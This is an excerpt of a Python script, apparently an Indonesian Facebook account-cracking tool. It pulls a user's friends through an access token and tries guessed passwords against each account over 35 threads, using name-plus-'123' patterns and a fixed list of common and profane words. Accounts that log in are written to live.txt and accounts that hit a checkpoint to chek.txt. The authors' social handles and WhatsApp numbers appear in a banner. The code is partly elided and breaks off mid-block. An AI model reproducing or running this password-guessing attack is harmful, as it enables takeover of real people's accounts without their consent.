...
#AUTHOR : latip176 & Radhin Al Haady
#module import
...
class crack:
	...
	def crackLike(self,user,pw,ttl):
		...
		if "c_user" in d.cookies:
			...
			print("")
			live.append(user+pw+"\n")
			save1=open("live.txt","a").write(live)
		elif "checkpoint" in d.cookies:
			cp+=1
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
			semoa+=1
			check.append(user+pw+ttl+"\n")
			save2=open("chek.txt","a").write(check)
		else:
			die+=1
	...
	def sendTeman(self):
		...
		print(title+"\nFollow IG : @latipharkat & ☣️ Radhin Al Haady ☣️_ | Wa : wa.me/+6283870396203 & wa.me/+62823-7315-8947\n")
		time.sleep(2)
		...
		with Bool(max_workers=35) as tokai:
			for x in r['data']:
				...
				pas=[r2['first_name']+"123",r2['first_name']+"12345","123456","12345678","Bangsad","Monyet","Mantan","Anjing","Kontol","Bangsad123","Doraemon","Bangsad123",r2['last_name']+"123",r2['last_name']+"12345"]
				for pw in pas:
		...
		try:
			...
			with Bool(max_workers=35) as tokai:
				...
				for x in r2['data']:
					...
					pas=[r3['first_name']+"123",r3['first_name']+"12345","123456","12345678","Bangsad","Monyet","Mantan","Anjing","Kontol","Bangsad123","Doraemon","Bangsad123",r3['last_name']+"123",r3['last_name']+"12345"]
					for pw in pas:
						try:tokai.submit(crack(self.token).crackPub,user,pw,ttl)
						except:tokai.submit(crack(self.token).crackPub,id,pw,ttl)
		except KeyError:
